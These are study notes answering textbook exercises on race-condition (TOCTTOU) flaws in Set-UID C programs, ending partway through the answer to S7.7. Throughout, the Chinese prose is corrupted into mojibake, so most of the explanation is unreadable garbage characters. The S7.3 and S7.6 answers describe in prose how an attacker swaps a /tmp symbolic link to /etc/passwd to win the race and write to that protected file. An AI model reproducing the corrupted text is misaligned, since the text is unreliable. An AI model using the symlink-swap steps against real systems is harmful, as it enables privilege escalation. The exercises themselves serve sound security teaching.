# Racing Condition ç»ƒä¹ é¢˜å’Œè§£æ

## é¢˜ç›®
![[Pasted image 20251117002749.png]]![[Pasted image 20251117002800.png]]![[Pasted image 20251117002809.png]]![[Pasted image 20251117002816.png]]
å¥½çš„ï¼Œæˆ‘ä»¬æ¥é€ä¸€è§£ç­”è¿™äº›å…³äºç«æ€æ¡ä»¶æ¼æ´çš„ç»ƒä¹ é¢˜ã€‚

### å…³é”®åè¯ (ä¸­è‹±æ–‡å¯¹ç…§)

*   **ç«æ€æ¡ä»¶ (Race Condition):** ä¸€ç§ç³»ç»Ÿæˆ–ç¨‹åºçš„è¾“å‡ºå–å†³äºå…¶ä»–ä¸å¯æ§äº‹ä»¶çš„æ‰§è¡Œæ—¶é—´é¡ºåºçš„æƒ…å†µã€‚
*   **Set-UID:** ä¸€ç§ç‰¹æ®Šçš„æƒé™ä½ï¼Œå…è®¸ç”¨æˆ·ä»¥æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆé€šå¸¸æ˜¯ rootï¼‰çš„æƒé™æ¥æ‰§è¡Œç¨‹åºã€‚
*   **æ£€æŸ¥æ—¶é—´ä¸ä½¿ç”¨æ—¶é—´å·® (Time-of-Check-to-Time-of-Use, TOCTTOU):** ä¸€ç§å› åœ¨æ£€æŸ¥èµ„æºçŠ¶æ€å’Œä½¿ç”¨è¯¥èµ„æºä¹‹é—´å­˜åœ¨æ—¶é—´çª—å£è€Œäº§ç”Ÿçš„ç«æ€æ¡ä»¶æ¼æ´ã€‚
*   **ç¬¦å·é“¾æ¥/è½¯é“¾æ¥ (Symbolic Link / Soft Link):** ä¸€ç§ç‰¹æ®Šç±»å‹çš„æ–‡ä»¶ï¼Œå…¶å†…å®¹æ˜¯åˆ°å¦ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„è·¯å¾„ã€‚
*   **æ–‡ä»¶æè¿°ç¬¦ (File Descriptor):** ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œå†…æ ¸ç”¨ä»¥è¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ã€‚
*   **åŸå­æ“ä½œ (Atomic Operation):** ä¸€ä¸ªä¸å¯ä¸­æ–­çš„æ“ä½œåºåˆ—ï¼›åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œå®ƒè¦ä¹ˆå®Œå…¨æ‰§è¡Œï¼Œè¦ä¹ˆå®Œå…¨ä¸æ‰§è¡Œï¼Œä¸ä¼šå‡ºç°ä¸­é—´çŠ¶æ€ã€‚
*   **æœ€å°æƒé™åŸåˆ™ (Principle of Least Privilege):** æŒ‡ä¸€ä¸ªä¸»ä½“ï¼ˆå¦‚è¿›ç¨‹ï¼‰åº”è¯¥åªæ‹¥æœ‰å®Œæˆå…¶ä»»åŠ¡æ‰€å¿…éœ€çš„æœ€å°‘æƒé™ã€‚
*   **ç²˜æ»ä½ (Sticky Bit):** åº”ç”¨äºç›®å½•çš„ä¸€ç§æƒé™ä½ï¼Œè®¾ç½®åï¼Œè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶åªèƒ½ç”±æ–‡ä»¶æ‰€æœ‰è€…ã€ç›®å½•æ‰€æœ‰è€…æˆ– root ç”¨æˆ·åˆ é™¤æˆ–é‡å‘½åã€‚

---

### S7.1. ä¸‹åˆ— Set-UID ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶æ¼æ´ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.1. ä¸‹åˆ— Set-UID ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶æ¼æ´ï¼Ÿ
```c
if (!access("/etc/passwd", W_OK)) {
    /* çœŸå®ç”¨æˆ·æ‹¥æœ‰å†™æƒé™ */
    f = open("/tmp/X", O_WRITE);
    write_to_file(f);
}
else {
    /* çœŸå®ç”¨æˆ·æ²¡æœ‰å†™æƒé™ */
    fprintf(stderr, "Permission denied\n");
}
```

#### è§£æ
**ä¸å­˜åœ¨å¯è¢«åˆ©ç”¨çš„ç«æ€æ¡ä»¶æ¼æ´ã€‚**

ç¨‹åºé¦–å…ˆä½¿ç”¨ `access()` æ£€æŸ¥**çœŸå®ç”¨æˆ·**æ˜¯å¦å¯¹ `/etc/passwd` æ–‡ä»¶æœ‰å†™å…¥æƒé™ã€‚å¯¹äºä¸€ä¸ªæ™®é€šç”¨æˆ·æ¥è¯´ï¼Œè¿™ä¸ªæ£€æŸ¥å‡ ä¹æ€»æ˜¯å¤±è´¥çš„ï¼Œå› ä¸º `/etc/passwd` æ–‡ä»¶é€šå¸¸åªå¯¹ root ç”¨æˆ·å¯å†™ã€‚

å› æ­¤ï¼Œ`access("/etc/passwd", W_OK)` çš„è¿”å›å€¼ä¸ä¼šæ˜¯ 0ï¼Œ`if` æ¡ä»¶ `!access(...)` ä¸ºå‡ã€‚ç¨‹åºå°†æ‰§è¡Œ `else` åˆ†æ”¯ï¼Œæ‰“å° "Permission denied" å¹¶é€€å‡ºã€‚ä½äº `if` å—å†…çš„ `open()` è°ƒç”¨æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œï¼Œå› æ­¤æ”»å‡»è€…æ²¡æœ‰æœºä¼šåœ¨ `access()` å’Œ `open()` ä¹‹é—´è¿›è¡Œæ”»å‡»ã€‚è™½ç„¶ä»£ç ç»“æ„çœ‹èµ·æ¥æœ‰â€œæ£€æŸ¥åä½¿ç”¨â€çš„æ¨¡å¼ï¼Œä½†ç”±äºæ£€æŸ¥çš„æ¡ä»¶ï¼ˆå¯¹ `/etc/passwd` çš„å†™æƒé™ï¼‰å¯¹æ”»å‡»è€…æ¥è¯´æ— æ³•æ»¡è¶³ï¼Œæ¼æ´çš„è§¦å‘è·¯å¾„å®é™…ä¸Šæ˜¯ä¸å¯è¾¾çš„ã€‚

---

### S7.2. ä½¿ç”¨ `faccess()` çš„ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.2. å‡è®¾æˆ‘ä»¬å¼€å‘äº†ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ `faccess(int fd, int mode)`ï¼Œå®ƒä¸ `access()` ç›¸åŒï¼Œåªæ˜¯è¦æ£€æŸ¥çš„æ–‡ä»¶ç”±æ–‡ä»¶æè¿°ç¬¦ `fd` æŒ‡å®šã€‚ä¸‹åˆ—ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿ
```c
int f = open("/tmp/x", O_WRITE);
if (!faccess(f, W_OK)) {
    write_to_file(f)
} else {
    close(f);
}
```

#### è§£æ
**ä¸å­˜åœ¨ç«æ€æ¡ä»¶é—®é¢˜ã€‚**

è¿™ä¸ªç¨‹åºé€šè¿‡ä»¥ä¸‹æ­¥éª¤é¿å…äº†ç«æ€æ¡ä»¶ï¼š
1.  **`open()` è·å–æ–‡ä»¶å¥æŸ„ï¼š** ç¨‹åºé¦–å…ˆè°ƒç”¨ `open()`ï¼Œå†…æ ¸ä¼šæ‰“å¼€ `/tmp/x` æ–‡ä»¶å¹¶è¿”å›ä¸€ä¸ª**æ–‡ä»¶æè¿°ç¬¦ (file descriptor)** `f`ã€‚è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯å†…æ ¸ä¸­å¯¹ä¸€ä¸ªç‰¹å®šæ–‡ä»¶ï¼ˆinodeï¼‰çš„ç›´æ¥å¼•ç”¨ã€‚
2.  **`faccess()` åŸºäºå¥æŸ„æ£€æŸ¥ï¼š** éšåçš„ `faccess(f, W_OK)` è°ƒç”¨æ˜¯åŸºäºè¿™ä¸ªå·²ç»ç¡®å®šçš„æ–‡ä»¶æè¿°ç¬¦ `f` æ¥æ£€æŸ¥æƒé™çš„ã€‚
3.  **æ¶ˆé™¤æ”»å‡»çª—å£ï¼š** æ”»å‡»è€…æ— æ³•åœ¨ `open()` ä¹‹åã€`faccess()` ä¹‹å‰é€šè¿‡ä¿®æ”¹æ–‡ä»¶åæˆ–ç¬¦å·é“¾æ¥æ¥æ”¹å˜ `f` æ‰€æŒ‡å‘çš„æ–‡ä»¶ã€‚æ–‡ä»¶æè¿°ç¬¦ä¸€æ—¦è¢«åˆ†é…ï¼Œå°±ä¸åŸå§‹æ–‡ä»¶ç»‘å®šã€‚

å› ä¸ºæ£€æŸ¥ (`faccess`) å’Œä½¿ç”¨ (`write_to_file`) éƒ½ä½œç”¨äºåŒä¸€ä¸ªç”±æ–‡ä»¶æè¿°ç¬¦ `f` é”å®šçš„æ–‡ä»¶å¥æŸ„ï¼Œæ‰€ä»¥â€œæ£€æŸ¥æ—¶é—´â€å’Œâ€œä½¿ç”¨æ—¶é—´â€ä¹‹é—´ä¸å­˜åœ¨æ”»å‡»çª—å£ã€‚è¿™ç§æ–¹æ³•æœ‰æ•ˆåœ°å°†æ£€æŸ¥å’Œä½¿ç”¨ç»‘å®šåˆ°äº†åŒä¸€ä¸ªå¯¹è±¡ä¸Šï¼Œæ¶ˆé™¤äº† TOCTTOU æ¼æ´ã€‚

---

### S7.3. æ”»å‡»è€…åœ¨ä¸‹åˆ—ç¨‹åºä¸­éœ€è¦èµ¢å¾—å¤šå°‘ä¸ªç«æ€æ¡ä»¶ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.3. æ”»å‡»è€…åœ¨ä¸‹åˆ—ç¨‹åºä¸­éœ€è¦èµ¢å¾—å¤šå°‘ä¸ªç«æ€æ¡ä»¶ï¼Ÿ
```c
int main()
{
    struct stat stat1, stat2;
    int fd1, fd2;

    if (access("/tmp/XYZ", O_RDWR)) {
        fprintf(stderr, "Permission denied\n");
        return -1;
    }
    else fd1 = open("/tmp/XYZ", O_RDWR);

    if (access("/tmp/XYZ", O_RDWR)) {
        fprintf(stderr, "Permission denied\n");
        return -1;
    }
    else fd2 = open("/tmp/XYZ", O_RDWR);

    // ç¨‹åºæ¥ç€æ£€æŸ¥ fd1 å’Œ fd2 æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶ï¼Œ
    // å¦‚æœæ˜¯ï¼Œç¨‹åºå°†å‘ fd1 (æˆ– fd2) å†™å…¥ã€‚
    // å¦åˆ™ï¼Œç¨‹åºä»€ä¹ˆä¹Ÿä¸åšå°±é€€å‡ºã€‚
}
```

#### è§£æ
**æ”»å‡»è€…éœ€è¦èµ¢å¾— 3 ä¸ªç«æ€æ¡ä»¶ã€‚**

æ”»å‡»çš„ç›®æ ‡æ˜¯è®© `fd1` å’Œ `fd2` éƒ½æŒ‡å‘ä¸€ä¸ªå—ä¿æŠ¤çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ `/etc/passwd`ï¼‰ã€‚è¿™éœ€è¦åœ¨ä¸€ç³»åˆ—æ“ä½œä¸­ç²¾ç¡®åœ°åˆ‡æ¢ `/tmp/XYZ` çš„æŒ‡å‘ã€‚æ”»å‡»çª—å£å¦‚ä¸‹ï¼š

1.  **èµ¢å¾—ç¬¬ 1 ä¸ªç«æ€æ¡ä»¶ (çª—å£ 1):** åœ¨ç¬¬ä¸€ä¸ª `access()` ä¹‹åå’Œç¬¬ä¸€ä¸ª `open()` ä¹‹å‰ã€‚
    *   æ”»å‡»å‰ï¼š`/tmp/XYZ` æŒ‡å‘æ”»å‡»è€…æ‹¥æœ‰çš„æ–‡ä»¶ï¼Œä½¿ `access()` æ£€æŸ¥é€šè¿‡ã€‚
    *   çª—å£æœŸæ“ä½œï¼šæ”»å‡»è€…è¿…é€Ÿå°† `/tmp/XYZ` æ”¹ä¸ºæŒ‡å‘ `/etc/passwd` çš„ç¬¦å·é“¾æ¥ã€‚
    *   ç»“æœï¼š`fd1 = open(...)` æ‰“å¼€äº† `/etc/passwd`ã€‚

2.  **èµ¢å¾—ç¬¬ 2 ä¸ªç«æ€æ¡ä»¶ (çª—å£ 2):** åœ¨ç¬¬ä¸€ä¸ª `open()` ä¹‹åå’Œç¬¬äºŒä¸ª `access()` ä¹‹å‰ã€‚
    *   çª—å£æœŸæ“ä½œï¼šæ”»å‡»è€…å¿…é¡»è¿…é€Ÿå°† `/tmp/XYZ` æŒ‡å›è‡ªå·±æ‹¥æœ‰çš„æ–‡ä»¶ã€‚
    *   ç»“æœï¼šç¬¬äºŒä¸ª `access()` æ£€æŸ¥å†æ¬¡é€šè¿‡ã€‚

3.  **èµ¢å¾—ç¬¬ 3 ä¸ªç«æ€æ¡ä»¶ (çª—å£ 3):** åœ¨ç¬¬äºŒä¸ª `access()` ä¹‹åå’Œç¬¬äºŒä¸ª `open()` ä¹‹å‰ã€‚
    *   çª—å£æœŸæ“ä½œï¼šæ”»å‡»è€…å†æ¬¡å°† `/tmp/XYZ` æ”¹ä¸ºæŒ‡å‘ `/etc/passwd` çš„ç¬¦å·é“¾æ¥ã€‚
    *   ç»“æœï¼š`fd2 = open(...)` ä¹Ÿæ‰“å¼€äº† `/etc/passwd`ã€‚

æœ€ç»ˆï¼Œç¨‹åºé€šè¿‡ `fstat()` ç­‰æ–¹å¼æ£€æŸ¥å‘ç° `fd1` å’Œ `fd2` æŒ‡å‘åŒä¸€ä¸ª inodeï¼ˆå³ `/etc/passwd` çš„ inodeï¼‰ï¼Œæ£€æŸ¥é€šè¿‡ï¼Œä»è€Œå‘å—ä¿æŠ¤æ–‡ä»¶å†™å…¥æ•°æ®ã€‚æ”»å‡»è€…å¿…é¡»æˆåŠŸå®Œæˆè¿™ä¸‰æ¬¡åˆ‡æ¢ï¼Œå› æ­¤éœ€è¦èµ¢å¾—å…¨éƒ¨ 3 ä¸ªç«æ€æ¡ä»¶ã€‚

---

### S7.4. `open()` ç³»ç»Ÿè°ƒç”¨æœ¬èº«æ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.4. åœ¨ `open()` ç³»ç»Ÿè°ƒç”¨ä¸­ï¼Œå®ƒé¦–å…ˆæ£€æŸ¥ç”¨æˆ·æ˜¯å¦æ‹¥æœ‰è®¿é—®ç›®æ ‡æ–‡ä»¶çš„æ‰€éœ€æƒé™ï¼Œç„¶åæ‰å®é™…æ‰“å¼€æ–‡ä»¶ã€‚è¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªâ€œæ£€æŸ¥åä½¿ç”¨â€çš„æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼æ˜¯å¦ä¼šå¯¼è‡´ç«æ€æ¡ä»¶é—®é¢˜ï¼Ÿ

#### è§£æ
**ä¸ä¼šã€‚**

è™½ç„¶ `open()` å†…éƒ¨ä¹Ÿéµå¾ªâ€œæ£€æŸ¥åä½¿ç”¨â€çš„é€»è¾‘ï¼Œä½†å®ƒ**ä¸ä¼š**å¯¼è‡´ç”¨æˆ·å¯ä»¥åˆ©ç”¨çš„ç«æ€æ¡ä»¶æ¼æ´ã€‚åŸå› æ˜¯ï¼š
1.  **åŸå­æ€§ï¼š** æƒé™æ£€æŸ¥å’Œæ–‡ä»¶æ‰“å¼€è¿™ä¸¤ä¸ªæ­¥éª¤éƒ½æ˜¯åœ¨**å†…æ ¸ç©ºé—´**ä¸­ä½œä¸ºä¸€ä¸ª**åŸå­æ“ä½œ**å®Œæˆçš„ã€‚
2.  **å†…æ ¸ä¿æŠ¤ï¼š** å½“ä¸€ä¸ªè¿›ç¨‹çš„ `open()` è°ƒç”¨è¿›å…¥å†…æ ¸åï¼Œå†…æ ¸å¯ä»¥åˆ©ç”¨å†…éƒ¨çš„é”æœºåˆ¶æ¥ç¡®ä¿åœ¨æ£€æŸ¥æƒé™åˆ°å®é™…æ‰“å¼€æ–‡ä»¶çš„è¿™ä¸ªæå°çš„æ—¶é—´çª—å£å†…ï¼Œæ²¡æœ‰å…¶ä»–ä»»ä½•è¿›ç¨‹å¯ä»¥ä¿®æ”¹ç›®æ ‡æ–‡ä»¶çš„çŠ¶æ€ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ç¬¦å·é“¾æ¥è¿›è¡Œåˆ‡æ¢ï¼‰ã€‚

ç”±äºæ•´ä¸ªæ“ä½œå¯¹äºç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹æ¥è¯´æ˜¯ä¸å¯ä¸­æ–­çš„ï¼Œæ”»å‡»è€…æ— æ³•åœ¨æ£€æŸ¥å’Œä½¿ç”¨ä¹‹é—´æ’å…¥æ¶æ„æ“ä½œã€‚å› æ­¤ï¼Œ`open()` ç³»ç»Ÿè°ƒç”¨æœ¬èº«æ˜¯å®‰å…¨çš„ï¼Œä¸ä¼šå—åˆ° TOCTTOU æ”»å‡»ã€‚

---

### S7.5. æœ€å°æƒé™åŸåˆ™èƒ½å¦æœ‰æ•ˆé˜²å¾¡ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.5. æœ€å°æƒé™åŸåˆ™å¯ä»¥æœ‰æ•ˆåœ°é˜²å¾¡æœ¬ç« è®¨è®ºçš„ç«æ€æ¡ä»¶æ”»å‡»ã€‚æˆ‘ä»¬èƒ½å¦ä½¿ç”¨åŒæ ·çš„åŸåˆ™æ¥æŒ«è´¥ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿå³ï¼Œåœ¨æ‰§è¡Œæ˜“å—æ”»å‡»çš„å‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬ç¦ç”¨ root æƒé™ï¼›åœ¨æ˜“å—æ”»å‡»çš„å‡½æ•°è¿”å›åï¼Œæˆ‘ä»¬å†æ¢å¤æƒé™ã€‚

#### è§£æ
**ä¸èƒ½ã€‚è¿™ç§æ–¹æ³•å¯¹é˜²å¾¡ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ— æ•ˆã€‚**

åŸå› åœ¨äºä¸¤ç§æ”»å‡»çš„æ ¹æœ¬åŒºåˆ«ï¼š

*   **ç«æ€æ¡ä»¶æ”»å‡»ï¼š** æ”»å‡»è€…åªæ˜¯æ“çºµç¨‹åºçš„**ç¯å¢ƒ**ï¼ˆä¾‹å¦‚ï¼Œä¿®æ”¹ç¬¦å·é“¾æ¥ï¼‰ï¼Œä½†**ä¸èƒ½æ‰§è¡Œè‡ªå·±çš„ä»£ç **ã€‚å› æ­¤ï¼Œå¦‚æœç¨‹åºåœ¨æ‰§è¡Œæ•æ„Ÿæ“ä½œï¼ˆå¦‚ `open`ï¼‰å‰æ”¾å¼ƒäº† root æƒé™ï¼Œè¯¥æ“ä½œå°±ä¼šå› ä¸ºæƒé™ä¸è¶³è€Œå¤±è´¥ï¼Œæ”»å‡»è€…æ²¡æœ‰åŠæ³•é‡æ–°è·å–æƒé™ã€‚
*   **ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼š** æ”»å‡»çš„æ ¸å¿ƒæ˜¯**åŠ«æŒç¨‹åºçš„æ§åˆ¶æµ**ï¼Œä½¿å…¶**æ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„æ¶æ„ä»£ç  (shellcode)**ã€‚å¦‚æœç¨‹åºåªæ˜¯ä¸´æ—¶æ”¾å¼ƒæƒé™ï¼ˆä½¿ç”¨ `seteuid()`ï¼‰ï¼Œé‚£ä¹ˆæ”»å‡»è€…çš„ä»£ç ä¸€æ—¦è¢«æ‰§è¡Œï¼Œå®ƒå°±å¯ä»¥ç®€å•åœ°è°ƒç”¨ `seteuid(0)` æ¥æ¢å¤ root æƒé™ï¼Œå› ä¸ºä¿å­˜çš„ set-user-ID ä»ç„¶æ˜¯ rootã€‚

å› æ­¤ï¼Œä¸´æ—¶ç¦ç”¨æƒé™æ— æ³•é˜»æ­¢èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç çš„æ”»å‡»ï¼Œå› ä¸ºæ”»å‡»ä»£ç æœ¬èº«å°±å¯ä»¥å°†æƒé™æ¢å¤ã€‚

---

### S7.6. ä¸‹åˆ—ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.6. ä¸‹åˆ— root æ‰€æœ‰çš„ Set-UID ç¨‹åºéœ€è¦å‘ä¸€ä¸ªæ–‡ä»¶å†™å…¥ï¼Œä½†å®ƒæƒ³ç¡®ä¿è¯¥æ–‡ä»¶ä¸ºç”¨æˆ·æ‰€æœ‰ã€‚å®ƒä½¿ç”¨ `stat()` æ¥è·å–æ–‡ä»¶æ‰€æœ‰è€…çš„ IDï¼Œå¹¶ä¸è¿›ç¨‹çš„çœŸå®ç”¨æˆ· ID æ¯”è¾ƒã€‚å¦‚æœäºŒè€…ä¸åŒ¹é…ï¼Œç¨‹åºå°†é€€å‡ºã€‚è¯·æè¿°è¯¥ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶ï¼Ÿå¦‚æœå­˜åœ¨ï¼Œè¯·è§£é‡Šå¦‚ä½•åˆ©ç”¨å®ƒã€‚
```c
// ... includes ...
int main()
{
    // ... declarations ...
    fp = fopen("/tmp/XYZ", "a+");
    stat("/tmp/XYZ", &statbuf);

    printf("The file owner's user ID: %d\n", statbuf.st_uid);
    printf("The process's real user ID: %d\n", getuid());

    // Check whether the file belongs to the user
    if (statbuf.st_uid == getuid()) {
        printf("IDs match, continue to write to the file.\n");
        // write to the file ...
        if (fp) fclose(fp);
    } else {
        printf("IDs do not match, exit.\n");
        if (fp) fclose(fp);
        return -1;
    }
    return 0;
}
```

#### è§£æ
**æ˜¯ï¼Œè¯¥ç¨‹åºå­˜åœ¨ä¸€ä¸ªç»å…¸çš„ TOCTTOU ç«æ€æ¡ä»¶æ¼æ´ã€‚**

æ”»å‡»çª—å£ä½äº `fopen()` è°ƒç”¨å’Œ `stat()` è°ƒç”¨ä¹‹é—´ã€‚

**åˆ©ç”¨æ–¹æ³•ï¼š**

æ”»å‡»è€…éœ€è¦èµ¢å¾— `fopen()` å’Œ `stat()` ä¹‹é—´çš„ç«æ€ã€‚

1.  **å‡†å¤‡ï¼š** æ”»å‡»è€…åœ¨å…¶æ§åˆ¶çš„è¿›ç¨‹ä¸­å¾ªç¯æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
    *   å°† `/tmp/XYZ` è®¾ç½®ä¸ºæŒ‡å‘ä¸€ä¸ªå—ä¿æŠ¤æ–‡ä»¶ï¼ˆå¦‚ `/etc/passwd`ï¼‰çš„ç¬¦å·é“¾æ¥ã€‚
    *   ç¨ç­‰ç‰‡åˆ»ï¼Œå†å°† `/tmp/XYZ` è®¾ç½®ä¸ºæŒ‡å‘ä¸€ä¸ªè‡ªå·±æ‹¥æœ‰çš„æ–‡ä»¶ï¼ˆå¦‚ `/tmp/dummy`ï¼‰çš„ç¬¦å·é“¾æ¥ã€‚

2.  **æ”»å‡»æ‰§è¡Œè¿‡ç¨‹ï¼š**
    *   **æ­¥éª¤ 1 (`fopen`)ï¼š** å½“ Set-UID ç¨‹åºæ‰§è¡Œ `fopen("/tmp/XYZ", "a+")` æ—¶ï¼Œå¦‚æœ `/tmp/XYZ` æ­£å¥½æŒ‡å‘ `/etc/passwd`ï¼Œç”±äºç¨‹åºæ‹¥æœ‰ root æƒé™ï¼Œ`fopen()` ä¼šæˆåŠŸæ‰“å¼€ `/etc/passwd` æ–‡ä»¶ã€‚è¿”å›çš„æ–‡ä»¶æŒ‡é’ˆ `fp` ç°åœ¨å°±æŒ‡å‘äº† `/etc/passwd`ã€‚
    *   **æ­¥éª¤ 2 (èµ¢å¾—ç«æ€)ï¼š** åœ¨ç¨‹åºæ‰§è¡Œ `stat()` ä¹‹å‰ï¼Œæ”»å‡»è€…çš„è¿›ç¨‹å¿…é¡»æˆåŠŸåœ°å°† `/tmp/XYZ` ç¬¦å·é“¾æ¥åˆ‡æ¢ä¸ºæŒ‡å‘è‡ªå·±æ‹¥æœ‰çš„æ–‡ä»¶ `/tmp/dummy`ã€‚
    *   **æ­¥éª¤ 3 (`stat`)ï¼š** ç¨‹åºæ¥ç€æ‰§è¡Œ `stat("/tmp/XYZ", &statbuf)`ã€‚æ­¤æ—¶ï¼Œå®ƒæ£€æŸ¥çš„æ˜¯ `/tmp/dummy` æ–‡ä»¶çš„å±æ€§ã€‚ç”±äºè¯¥æ–‡ä»¶ä¸ºæ”»å‡»è€…æ‰€æœ‰ï¼Œ`statbuf.st_uid` å°†ä¼šç­‰äº `getuid()`ï¼Œæƒé™æ£€æŸ¥é€šè¿‡ã€‚
    *   **æ­¥éª¤ 4 (å†™å…¥)ï¼š** ç¨‹åºè¿›å…¥ `if` å—ï¼Œå¹¶å‘ `fp` æŒ‡å‘çš„æ–‡ä»¶å†™å…¥æ•°æ®ã€‚å› ä¸º `fp` åœ¨ç¬¬ 1 æ­¥å·²ç»ç»‘å®šåˆ°äº† `/etc/passwd`ï¼Œæ‰€ä»¥æ•°æ®æœ€ç»ˆè¢«å†™å…¥äº†å—ä¿æŠ¤çš„å¯†ç æ–‡ä»¶ï¼Œæ”»å‡»æˆåŠŸã€‚

è¿™ä¸ªæ¼æ´çš„æ ¹æºåœ¨äºï¼Œç¨‹åºæ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶ååˆåŸºäºæ–‡ä»¶åå»æ£€æŸ¥äº†å¦ä¸€ä¸ªæ–‡ä»¶çš„å±æ€§ã€‚

---

### S7.7. ä½¿ç”¨ `fstat()` çš„ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ

#### ä¸­æ–‡ç¿»è¯‘
S7.7. ä¸‹åˆ— root æ‰€æœ‰çš„ Set-UID ç¨‹åºéœ€è¦å‘ä¸€ä¸ªæ–‡ä»¶å†™å…¥ï¼Œä½†å®ƒæƒ³ç¡®ä¿è¯¥æ–‡ä»¶ä¸ºç”¨æˆ·æ‰€æœ‰ã€‚å®ƒä½¿ç”¨ `fstat()` æ¥è·å–æ–‡ä»¶æ‰€æœ‰è€…çš„ IDï¼Œå¹¶ä¸è¿›ç¨‹çš„çœŸå®ç”¨æˆ· ID æ¯”è¾ƒã€‚å¦‚æœäºŒè€…ä¸åŒ¹é…ï¼Œç¨‹åºå°†é€€å‡ºã€‚è¯·æè¿°è¯¥ç¨‹åºæ˜¯å¦å­˜åœ¨ç«æ€æ¡ä»¶ï¼Ÿå¦‚æœå­˜åœ¨ï¼Œè¯·è§£é‡Šå¦‚ä½•åˆ©ç”¨å®ƒã€‚`fstat()` å’Œ `fileno()` çš„æ‰‹å†Œå¯ä»¥åœ¨çº¿æ‰¾åˆ°ã€‚
```c
// ... includes ...
int main()
{
    // ... declarations ...
    fp = fopen("/tmp/XYZ", "a+");
    fstat(fileno(fp), &statbuf);

    printf("The file owner's user ID: %d\n", statbuf.st_uid);
    printf("The process's real user ID: %d\n", getuid());

    // Check whether the file belongs to the user
    if (statbuf.st_uid == getuid()) {
        printf("IDs match, continue to write to the file.\n");
        // write to the file ...
        if (fp) fclose(fp);
    } else {
        printf("IDs do not match, exit.\n");
        if (fp) fclose(fp);
        return -1;
    }
    return 0;
}
```

#### è§£æ
**ä¸å­˜åœ¨ç«æ€æ¡ä»¶æ¼æ´ã€‚**

è¿™ä¸ªç‰ˆæœ¬çš„ç¨‹åºé€šè¿‡ä½¿ç”¨ `fstat()` ä¿®å¤äº† S7.6 ä¸­çš„æ¼æ´ã€‚åŸå› å¦‚ä¸‹ï¼š

1.  **`fopen()` è·å–æ–‡ä»¶å¥æŸ„:** ç¨‹åºé¦–å…ˆè°ƒç”¨ `fopen()` æ‰“å¼€ `/tmp/XYZ` æ–‡ä»¶ï¼Œå¹¶è·å¾—ä¸€ä¸ªæ–‡ä»¶æµæŒ‡é’ˆ `fp`ã€‚
2.  **`fileno()` è·å–æ–‡ä»¶æè¿°ç¬¦:** `fileno(fp)` å‡½æ•°ä»æ–‡ä»¶æµæŒ‡é’ˆ `fp` ä¸­æå–å‡ºå†…æ ¸å¯¹åº”çš„**æ–‡ä»¶æè¿°ç¬¦ (file descriptor)**ã€‚è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ˜¯å†…æ ¸ä¸­å¯¹å·²æ‰“å¼€æ–‡ä»¶çš„å”¯ä¸€ã€ç¡®å®šçš„å¼•ç”¨ã€‚
3.  **`fstat()` åŸºäºæ–‡ä»¶æè¿°ç¬¦æ£€æŸ¥:** `fstat()` å‡½æ•°ç›´æ¥å¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦è¿›è¡Œæ“ä½œï¼Œè·å–è¯¥**å·²æ‰“å¼€æ–‡ä»¶**çš„å…ƒæ•°æ®ï¼ˆåŒ…æ‹¬æ‰€æœ‰è€… IDï¼‰ã€‚

